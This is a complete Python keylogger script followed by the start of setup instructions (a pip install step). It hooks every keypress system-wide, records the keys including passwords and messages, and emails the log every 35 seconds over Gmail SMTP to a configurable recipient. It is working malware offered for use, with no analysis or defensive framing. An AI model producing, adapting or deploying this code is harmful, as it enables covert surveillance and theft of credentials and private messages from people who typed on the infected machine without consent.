
import keyboard
import time
import smtplib
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import os

# Configuration
EMAIL_ADDRESS = "your_email@gmail.com"  # Replace with your Gmail
EMAIL_PASSWORD = "your_app_password"    # Replace with your Gmail app password
TO_EMAIL = "recipient@example.com"      # Replace with recipient's email
SEND_INTERVAL = 35                      # Send every 35 seconds
LOG_FILE = "keylog.txt"

# Global variables
log_data = []
is_logging = True

def send_email_report():
    """Send keylog via email"""
    try:
        # Create message
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL
        msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        # Add body to email
        body = f"Keylogger Report\n\n"
        body += f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        body += f"Total keystrokes: {len(log_data)}\n\n"
        body += "Keystrokes:\n"
        body += "".join(log_data)

        msg.attach(MIMEText(body, 'plain'))

        # Gmail SMTP configuration
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

        # Send email
        text = msg.as_string()
        server.sendmail(EMAIL_ADDRESS, TO_EMAIL, text)
        server.quit()

        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Email sent successfully")
    except Exception as e:
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Error sending email: {e}")

def log_key(event):
    """Callback function to log keystrokes"""
    if event.event_type == keyboard.KEY_DOWN:
        key = event.name
        # Handle special keys
        if key == "space":
            key = " "
        elif key == "enter":
            key = "\n"
        elif key == "tab":
            key = "\t"
        elif key == "backspace":
            key = "[BACKSPACE]"
        elif key == "caps lock":
            key = "[CAPS]"
        elif key == "shift":
            key = "[SHIFT]"
        elif key == "ctrl":
            key = "[CTRL]"
        elif key == "alt":
            key = "[ALT]"
        elif key == "esc":
            key = "[ESC]"
        elif len(key) > 1:
            key = f"[{key.upper()}]"

        log_data.append(key)

def start_keylogger():
    """Start the keylogger"""
    global is_logging

    print("Keylogger started. Press Ctrl+C to stop.")
    print(f"Sending reports every {SEND_INTERVAL} seconds")

    # Register keylogger
    keyboard.on_press(log_key)

    # Start sending emails in a separate thread
    def send_reports():
        while is_logging:
            time.sleep(SEND_INTERVAL)
            if log_data:
                send_email_report()
                # Clear log data after sending
                log_data.clear()

    # Start email sending thread
    email_thread = threading.Thread(target=send_reports, daemon=True)
    email_thread.start()

    try:
        # Keep main thread alive
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
        is_logging = False
        keyboard.unhook_all()
        # Send final report
        if log_data:
            send_email_report()
        print("Keylogger stopped.")

if __name__ == "__main__":
    start_keylogger()


### Setup Instructions:

1. **Install Required Libraries:**
```bash
pip install keyboard
